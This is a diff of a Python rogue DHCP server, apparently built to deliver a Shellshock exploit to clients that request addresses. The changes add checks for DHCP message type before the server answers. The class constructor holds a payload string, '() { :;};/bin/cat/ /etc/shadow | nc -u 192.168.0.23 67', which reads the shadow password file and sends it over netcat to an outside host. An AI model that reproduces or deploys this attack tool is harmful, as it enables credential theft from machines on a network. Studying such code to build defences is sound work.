@@ -6,7 +6,8 @@ import time
 import itertools
 
 def flatten_list(ze_list):
-    ''' Flatens a list, (requires all items to be lists?)
+    '''
+    Flatens a list of lists
     '''
     for sublist in ze_list:
         if isinstance(sublist, collections.Iterable) and not isinstance(sublist, (str, bytes)):
@@ -27,7 +28,9 @@ class Listener:
         self.dhcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
 
     def start(self):
-        ''' Starts the socket listener and replies when appropriate '''
+        '''
+        Starts the socket listener and replies when appropriate
+        '''
         self.dhcp_socket.bind(('', 67))
         while True:
             r, w, x = select.select([self.dhcp_socket], [], [])
@@ -55,23 +58,34 @@ class Listener:
                 if any(x.xid == dhcpPacket.xid for x in self.current_discovery):
                     for eachPacket in self.current_discovery:
                         if eachPacket.xid == dhcpPacket.xid:
-                            print(eachPacket)
-                            print('[+] Crafting ACK')
-                            ack = eachPacket.craft_ack()
-                            self.dhcp_socket.sendto(ack, ('255.255.255.255', 68))
-                            self.client_list.append(eachPacket)
-                            print(self.current_discovery)
-                            self.current_discovery.remove(eachPacket)
+
+                            # CONFIRM PACKET IS REQUEST
+                            for each_option in dhcpPacket.options:
+                                if each_option.flag == b'\x35':
+                                    if each_option.values == [b'\x03']:
+                                        print('[+] Crafting ACK')
+                                        ack = eachPacket.craft_ack()
+                                        self.dhcp_socket.sendto(ack, ('255.255.255.255', 68))
+                                        self.client_list.append(eachPacket)
+                                        self.current_discovery.remove(eachPacket)
+                                    break
                 else:
-                    print('[+] Crafting offer')
-                    self.current_discovery.append(dhcpPacket)
-                    offer = dhcpPacket.craft_offer()
-                    print(offer)
-                    self.dhcp_socket.sendto(offer, ('255.255.255.255', 68))
+
+                    # CONFIRM PACKET IS DISCOVERY
+                    for each_option in dhcpPacket.options:
+                        if each_option.flag == b'\x35':
+                            if each_option.values == [b'\x01']:
+                                print('[+] Crafting offer')
+                                self.current_discovery.append(dhcpPacket)
+                                offer = dhcpPacket.craft_offer()
+                                self.dhcp_socket.sendto(offer, ('255.255.255.255', 68))
+                            break
 
 
 class DhcpPacket:
-    ''' Parse the message finding the difrent options and values of the dhcp packet '''
+    '''
+    Parse the message finding the difrent options and values of the dhcp packet
+     '''
     def __init__(self, dhcp_message):
         self.exploit = b"() { :;};/bin/cat/ /etc/shadow | nc -u 192.168.0.23 67"  # % (self.ip, self.port)
         self.exploit = [bytes(chr(x).encode('ascii')) for x in self.exploit]
@@ -180,7 +194,7 @@ class DhcpPacket:
         return return_packet
 
     def breakup_options(self, option_string):
-        ''' parse the options from the given packet, these are not yet used '''
+        ''' parse the options from the given packet'''
         print('[+] breaking up options')
         cur = 0
         option_string = [x for x in option_string]
